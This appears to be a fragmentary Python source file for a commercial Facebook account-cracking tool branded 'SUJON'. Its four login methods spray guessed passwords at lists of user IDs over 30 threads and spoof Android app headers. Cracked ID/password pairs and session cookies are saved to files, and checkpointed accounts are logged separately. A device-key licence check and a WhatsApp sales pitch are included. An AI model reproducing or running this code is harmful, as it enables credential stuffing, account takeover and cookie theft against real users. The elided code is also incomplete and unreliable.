...
try:
	prox= requests.get('https://github.com/mrerror807-blip/Sizan2/blob/main/APPROVAL.txt').text
...
os.system('clear')
print('         \x1b[38;5;46m WELCOME TO SUJON WORLD         ')
...
from concurrent.futures import ThreadPoolExecutor as SiamSUJON
from string import * 
...
totaldmp = 0
filter = []
os.system("xdg-open https://m.me/sujonbevies")
sys.stdout.write('\x1b]2;SUJON\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
_______________________________________________
 ...
 \033[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;31mAUTHOR:SUJON\033[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
──────────────────────────────────────────────────
\033[1;92m Owner   :            SUJON BE'VIES
\033[1;92m Facebook:            SUJON BEVIES
\033[1;92m Github  :            sujonbbz
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        exit()
os.system("xd-open https://facebook.com/sujonbevies")
def menu():   
    os.system('clear')
    print(logo)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mSUJON😈-XD-M1\33[1;92m] %s | \033[1;92mOK✅:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SUJONb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SUJONb};{ckkk}"
                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mSUJON-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                    
                    Elite(sid,ps,ckkk)
                    oks.append(sid)                 
                    open('/sdcard/SUJON/OK_ids_M1.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/SUJON/COOKiEs_M1.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r\x1b[1;96m [SUJON😈-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SUJON/M1-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mSUJON-XD-M3\33[1;92m] %s | \033[1;92mOK✅:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/SUJON/OK_ids_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SUJON/COOKiEs_M3.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                   # print(f"\r\x1b[1;96m [SUJON😈-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/SUJON/M3-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mSUJON😈-XD-M2\33[1;92m] %s | \033[1;92mOK✅:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard//SUJON/OK_ids_M2.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/SUJON/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r\x1b[1;96m [SUJON-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/SUJON/M2-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodD(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mSUJON-XD-M4\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/SUJON/OK_ids_M4.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/SUJON/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                  #    print(f"\r\x1b[1;96m [Fuck] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard//SUJON/M4-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def pasw(self):       
            ...
            print("\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            with SiamSUJON(max_workers=30) as SUJONworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                SUJONworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                SUJONworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                SUJONworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                SUJONworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)
        ...
        for ps in pwx:
          ...
          "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[SUJON😈-OK] '+cid+' | '+ps+'\033[0;97m')
                print('\n[‎‎🍪]\033[0;33m COOKIES = \033[1;34m'+coki+  '  ''  \033[0;97m')
                linex()
                open('SUJON-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[SUJON😈-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('SUJON-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;92m[SUJON😈]\033[1;92m] %s|\33[1;31m[OK✅]:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass 
############            
...
def main_apv():
    ...
    print(logo)
    uuid = str(os.geteuid())
    Xyteee=('SUJON1x6b7b5c%s85b8n9nfdi%s'%(uuid,uuid))
    print(logo)
    ...
    try:
        ...
        if Xyteee in system:
            ...
            print('\033[1;92m[\033[1;92m•\033[1;92m]\033[1;92m Notes : SUJON Tools Can buy in all countries!')
            print('\033[1;92m-----------------------------------------------------\033[1;97m')
            ...
            print("-----------------------------------------------------")
            url_wa = "https://api.whatsapp.com/send?phone=+8801916106221&text="
            choice = input(" Enter your choice  : ")
            tks = ("Hi Sujon Sir, I Need To Buy Your SUJON Tools Version 0.1Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
...
with SiamSUJON(max_workers=30) as rhu:
 #   rhu.submit(sexy)
    rhu.submit(main_apv)
